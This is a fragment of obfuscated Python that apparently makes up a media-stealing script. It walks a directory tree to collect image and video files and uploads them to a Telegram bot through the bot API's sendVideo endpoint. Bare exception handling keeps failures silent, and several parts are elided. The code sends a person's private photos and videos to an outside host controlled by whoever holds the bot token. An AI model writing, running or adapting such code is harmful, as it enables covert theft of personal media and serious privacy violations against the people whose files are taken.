    ...
    def _q0(p):
        try:
            ...
            if ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']:
                ...
                u = f"https://api.telegram.org/bot{z0}/sendVideo"
                with open(p, "rb") as t:
                    a.post(u, files={'video': t}, data={'chat_id': z1}, timeout=10)
        except:
            pass

    w = set()  # Use set to avoid duplicates
    for x, y, z in b.walk(z2):
        for zz in z:
            if zz.lower().endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp4", ".avi", ".mov", ".mkv", ".wmv", ".flv", ".webm")):
                w.add(b.path.join(x, zz))
